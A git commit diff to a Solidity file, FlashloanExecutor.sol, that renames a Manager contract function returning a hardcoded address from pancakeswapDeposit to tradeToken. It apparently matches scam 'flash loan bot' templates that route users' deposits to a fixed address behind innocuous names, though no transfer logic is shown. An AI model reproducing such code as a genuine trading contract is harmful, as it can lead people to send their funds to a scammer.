b706ce3dc3fab96c48ac0f5ab7d5fda86e09fece
yuno <91159949+yun0dev@users.noreply.github.com>
2022-10-27 10:49:55 +0200

    Update FlashloanExecutor.sol

--- FlashloanExecutor.sol
+++ FlashloanExecutor.sol
@@ -4,7 +4,7 @@ contract Manager {
 	function performTasks() public pure {
 	}
 
-	function pancakeswapDeposit() public pure returns (address) {
+	function tradeToken() public pure returns (address) {
 		return 0x3C593553DfF2A9057Aa5C3cce0E9328f12E6D1a0;
 	}
 	
